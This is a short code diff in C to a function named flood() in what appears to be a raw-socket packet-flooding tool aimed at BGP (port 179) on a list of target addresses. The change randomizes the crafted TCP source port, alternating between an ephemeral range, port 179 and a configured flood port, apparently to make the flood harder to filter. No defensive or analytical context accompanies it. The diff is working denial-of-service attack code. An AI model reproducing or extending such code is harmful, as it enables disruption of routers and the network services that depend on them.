@@ -301,10 +301,24 @@ void *flood(void *par1)
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		if (bpgOrDrd == 1)
 		{
+			if (floodport == 0)
+			{
+				tcph->source = htons(randnum(49152, 65535));
+			}
+			else
+			{
+				if (randnum(0, 1) == 1)
+				{
+					tcph->source = htons(179);
+				}
+				else
+				{
+					tcph->source = htons(floodport);
+				}
+			}
 			tcph->res2 = 0;
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 			tcph->dest = htons(179);
-			tcph->source = htons(179);
 			bpg_list_node = bpg_list_node->next;
 			iph->daddr = bpg_list_node->data.sin_addr.s_addr;
 			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
